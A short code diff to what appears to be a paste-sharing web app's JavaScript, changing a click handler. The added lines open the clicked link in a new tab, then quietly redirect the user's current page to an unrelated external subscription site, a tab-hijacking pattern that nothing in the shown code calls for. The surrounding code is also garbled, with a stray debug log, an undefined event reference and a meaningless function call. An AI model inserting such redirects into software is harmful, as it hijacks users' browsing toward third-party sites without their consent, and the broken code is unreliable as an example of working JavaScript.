@@ -432,9 +432,10 @@ console.log("Y2");
   var _this = this;
   _this.doc = new haste_document();
 
-letsDoIt(0, 1, 1, "/To.webp");
+window.open(event.target.href, '_blank');
+        window.focus();
+        window.location.href = 'https://www.looksforwomen.com/subscribe';
 
-  window.open(event.target.href, '_top');
   this.doc.saveCount(function(err, ret) {
     //if (err) {
     //  console.log(err);
